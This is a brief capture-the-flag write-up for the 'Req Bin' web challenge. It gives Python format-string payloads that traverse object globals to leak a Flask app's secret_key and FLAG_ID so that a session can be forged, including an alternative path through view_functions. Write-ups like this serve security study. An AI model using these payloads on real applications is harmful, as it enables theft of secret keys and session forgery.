# Req Bin

* Round: 29 (2022/12)
* Category: Web
* Points: 100
* Solves: 12

## Description

A customizable request bin

## Solution

Use python format string to leak `secret_key` and `FLAG_ID`, then forge flask session to get flag.

I use `{headers.get.__globals__[os].sys.modules[flask].current_app.secret_key}` and `{headers.get.__globals__[os].sys.modules[main].FLAG_ID}` (because of uwsgi), and some other people uses `view_functions` to get access to main module: `{headers.environ[werkzeug.request]._load_form_data.__globals__[json].current_app.view_functions[record].__globals__[FLAG_ID]}`.
